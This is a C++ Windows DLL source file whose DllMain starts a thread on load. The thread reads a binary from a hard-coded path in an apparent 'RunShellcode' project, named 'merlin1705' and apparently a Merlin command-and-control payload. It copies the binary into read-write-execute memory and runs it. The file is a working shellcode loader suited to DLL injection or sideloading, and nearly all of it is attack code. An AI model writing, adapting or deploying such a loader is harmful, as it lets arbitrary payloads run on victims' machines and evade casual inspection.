// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "framework.h"
#include "memoryapi.h"
#include "wincrypt.h"
#include <fstream>


DWORD WINAPI ClientThread(LPVOID lpParameter)
{
    MSG Msg;
    FILE* in_file;
    errno_t error;
    struct stat sb;

    const char* filename = "C:\\Users\\Antoine\\source\\repos\\RunShellcode\\merlin1705";


    error = fopen_s(&in_file, filename, "rb");
    if (error != 0) {
        printf("The binary file could not be open\n");
    }

    if (stat(filename, &sb) == -1) {
        perror("stat");
        exit(EXIT_FAILURE);
    }

    char* file_contents = (char*)malloc(sb.st_size);
    fread(file_contents, sb.st_size, 1, in_file);
    fclose(in_file);

    void* exec = VirtualAlloc(0, sb.st_size + 3, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, file_contents, sb.st_size + 1);

    // Run shellcode
    int (*func)();
    func = (int (*)()) exec;
    (*func)();

    while (GetMessage(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    HANDLE threadHandle = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, ClientThread, NULL, 0, NULL);
        if (threadHandle != NULL) {
            CloseHandle(threadHandle);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


